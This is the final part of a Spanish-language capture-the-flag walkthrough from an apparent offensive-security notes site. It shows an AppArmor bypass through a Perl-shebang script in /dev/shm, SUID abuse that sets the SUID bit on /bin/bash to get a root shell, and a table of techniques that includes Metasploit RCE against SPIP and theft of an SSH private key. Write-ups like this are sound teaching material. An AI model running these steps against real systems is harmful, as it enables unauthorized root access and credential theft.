+<pre><code class="language-bash">think@ip-10-201-17-74:~$ echo "/bin/sh" &gt;&gt; /opt/run_container.sh
+-ash: /opt/run_container.sh: Permission denied
+</code></pre>
+<p>Crear un script en /dev/shm (shebang perl) y ejecutarlo para obtener shell menos restringida</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$  echo -e '#!/usr/bin/perl\nexec "/bin/sh"' &gt; /dev/shm/test.pl
+think@ip-10-201-17-74:~$ chmod +x /dev/shm/test.pl
+think@ip-10-201-17-74:~$ /dev/shm/test.pl
+</code></pre>
+<p>Desde la shell no confinada, sobrescribir el script root con payload</p>
+<pre><code class="language-bash">echo '#!/bin/bash\nchmod +s /bin/bash' &gt; /opt/run_container.sh
+</code></pre>
+<p>Esto crea un <code>/opt/run_container.sh</code> que, cuando se ejecute como root, pondrá el bit SUID en <code>/bin/bash</code>.</p>
+<pre><code class="language-bash">$ /usr/sbin/run_container
+</code></pre>
+<p>El SUID ejecuta <code>/opt/run_container.sh</code> <strong>con EUID=root</strong>, por tanto <code>chmod +s /bin/bash</code> se ejecuta como root. Luego comprobar:</p>
+<pre><code class="language-bash">ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+</code></pre>
+<p>Obtener shell root</p>
+<pre><code class="language-bash">/bin/bash -p
+bash-5.0# id
+uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
+</code></pre>
+<h2>Explicación</h2>
+<ol>
+<li><p><code>/usr/sbin/run_container</code> se ejecuta con privilegios de root (SUID) y llama a <code>/opt/run_container.sh</code></p>
+</li>
+<li><p><code>/opt/run_container.sh</code> era <strong>editable por usuarios normales</strong> → vulnerabilidad.</p>
+</li>
+<li><p>AppArmor impedía la escritura directa en ciertas rutas desde la shell confinada (<code>ash</code>).</p>
+</li>
+<li><p>Se usó un <em>bypass de AppArmor</em> creando/ejecutando un script en una ruta no confinada (<code>/dev/shm</code>) usando un shebang (<code>#!/usr/bin/perl</code>) o copiando un intérprete allí. Esa ejecución proporcionó una shell con menos restricciones (capaz de escribir en <code>/opt</code>).</p>
+</li>
+<li><p>Desde esa shell no confinada se sobrescribió <code>/opt/run_container.sh</code> con un comando que, cuando el SUID lo ejecutara, iba a cambiar permisos de <code>/bin/bash</code> para ponerle SUID.</p>
+</li>
+<li><p>Ejecutando el SUID la acción se hizo como <code>root</code>, se puso SUID en <code>/bin/bash</code> y al ejecutar <code>/bin/bash -p</code> se obtuvo EUID=0 → root.</p>
+</li>
+<li><p>Con Perl Lo que hicimos fue <strong>crear y ejecutar un script en <code>/dev/shm</code> (que es un <code>tmpfs</code>, es decir RAM)</strong> que lanzó una <strong>nueva shell no tan confinada</strong>. Esa shell seguía siendo del usuario <code>think</code> (uid=1000), pero <strong>no estaba sujeta a las mismas restricciones de AppArmor</strong> que tu <code>ash</code> inicial, por eso luego podemos escribir en <code>/opt</code> y continuar la explotación.</p>
+</li>
+</ol>
+<h1>Tecnicas Utilizadas</h1>
+<table>
+<thead>
+<tr>
+<th><strong>Fase</strong></th>
+<th><strong>Técnica / Herramienta</strong></th>
+<th><strong>Descripción</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconocimiento</strong></td>
+<td><code>nmap -sV -sS -Pn -p- -sC --min-rate 5000</code></td>
+<td>Escaneo completo de puertos y servicios para identificar vectores de ataque.</td>
+</tr>
+<tr>
+<td><strong>Fuzzing web</strong></td>
+<td><code>feroxbuster</code></td>
+<td>Enumeración de directorios en el servidor web para localizar rutas interesantes.</td>
+</tr>
+<tr>
+<td><strong>Explotación inicial</strong></td>
+<td><strong>Metasploit – exploit/multi/http/spip_bigup_unauth_rce</strong> (CVE-2023-27372)</td>
+<td>Explotación de vulnerabilidad de deserialización insegura en SPIP (plugin BigUp) → RCE sin autenticación.</td>
+</tr>
+<tr>
+<td><strong>Acceso inicial</strong></td>
+<td>Meterpreter → <code>shell</code></td>
+<td>Uso de la sesión Meterpreter para obtener una shell interactiva (<code>www-data</code>).</td>
+</tr>
+<tr>
+<td><strong>Estabilización</strong></td>
+<td><code>script -qc /bin/bash /dev/null</code></td>
+<td>Tratamiento de TTY para mejorar la interacción con la shell inicial.</td>
+</tr>
+<tr>
+<td><strong>Movimiento lateral</strong></td>
+<td>Lectura de <code>/home/think/.ssh/id_rsa</code></td>
+<td>Descubrimiento de la clave privada SSH del usuario <em>think</em>.</td>
+</tr>
+<tr>
+<td><strong>Acceso persistente</strong></td>
+<td><code>ssh -i id_rsa think@&lt;IP&gt;</code></td>
+<td>Uso de la clave privada exportada para autenticarse como <em>think</em>.</td>
+</tr>
+<tr>
+<td><strong>Enumeración local</strong></td>
+<td><code>find / -perm -4000 -type f</code></td>
+<td>Búsqueda de binarios SUID para identificar vectores de escalada a root.</td>
+</tr>
+<tr>
+<td><strong>Escalada de privilegios</strong></td>
+<td>SUID Abuse – <code>/usr/sbin/run_container</code></td>
+<td>Binario root que ejecuta <code>/opt/run_container.sh</code> (world-writable).</td>
+</tr>
+<tr>
+<td><strong>Restricción de seguridad</strong></td>
+<td>AppArmor (<code>/etc/apparmor.d/usr.sbin.ash</code>)</td>
+<td>Descubrimiento de perfil que impedía escribir directamente en <code>/opt</code>.</td>
+</tr>
+<tr>
+<td><strong>AppArmor Bypass</strong></td>
+<td><strong>Shebang Perl trick en <code>/dev/shm</code></strong></td>
+<td>Creación de un script <code>test.pl</code> con <code>#!/usr/bin/perl</code> para spawnear una shell fuera del confinamiento de AppArmor.</td>
+</tr>
+<tr>
+<td><strong>PrivEsc final</strong></td>
+<td>Modificación de <code>/opt/run_container.sh</code> → <code>chmod +s /bin/bash</code></td>
+<td>Al ejecutar el binario SUID, se asignó el bit SUID a <code>/bin/bash</code>.</td>
+</tr>
+<tr>
+<td><strong>Root shell</strong></td>
+<td><code>/bin/bash -p</code></td>
+<td>Ejecución de bash con privilegios elevados (EUID=0) para obtener root.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
